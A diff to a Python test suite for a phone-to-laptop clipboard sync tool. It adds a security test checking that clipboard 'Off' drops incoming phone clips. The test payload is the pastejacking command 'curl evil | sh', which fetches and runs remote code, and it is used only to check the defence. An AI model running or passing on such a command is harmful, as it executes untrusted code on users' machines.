@@ -31,14 +31,14 @@ def test_classify_and_parse():
     assert parse_offer({"kind": "skip", "why": "secret"}) == "secret"
 
 
-async def subscribe(port, fp, cfg, clip=True):
+async def subscribe(port, fp, cfg, clip=True, expect_clip=1):
     r, w = await client._open("127.0.0.1", port, fp, cfg)
     m = {"type": "subscribe", "device_name": "fake-phone", "resume": 1}
     if clip:
         m["clip"] = 1
     w.write(encode_frame(m)); await w.drain()
     ok = await read_frame(r)
-    assert ok["type"] == "subscribed" and ok.get("clip") == 1     # 0.13: laptop accepts phone clips
+    assert ok["type"] == "subscribed" and ok.get("clip") == expect_clip   # 0.13: laptop accepts phone clips
     return r, w
 
 
@@ -153,4 +153,29 @@ def test_phone_to_laptop_and_no_echo(paired):
         m, data = await next_clip(r)
         assert data == b"new laptop copy"
         w.close()
+    asyncio.run(go())
+
+
+def test_off_drops_phone_clips(paired):
+    """Security review #5: clipboard "Off" also refuses phone → laptop clips (no pastejacking)."""
+    port, fp, _, ccfg, _, tmp = paired
+    SINK.write_bytes(b"before")
+
+    async def go():
+        set_key(tmp / "cfg", "clipboard", "off")
+        assert (await asyncio.to_thread(ctl, tmp, {"cmd": "reload"}))["clipboard"] == "off"
+        r, w = await subscribe(port, fp, ccfg, expect_clip=0)     # the phone is told not to send clips
+        await asyncio.sleep(0.2)
+        data = b"curl evil | sh\n"
+        w.write(encode_frame({"type": "clip", "kind": "text", "mime": "text/plain", "size": len(data),
+                              "sha256": hashlib.sha256(data).hexdigest(), "origin": "phone"}) + data)
+        await w.drain()
+        w.write(encode_frame({"type": "ping"})); await w.drain()       # link survives the dropped clip
+        while (await asyncio.wait_for(read_frame(r), 5))["type"] != "pong":
+            pass
+        await asyncio.sleep(0.3)
+        assert SINK.read_bytes() == b"before"
+        w.close()
+        set_key(tmp / "cfg", "clipboard", "auto")
+        await asyncio.to_thread(ctl, tmp, {"cmd": "reload"})
     asyncio.run(go())
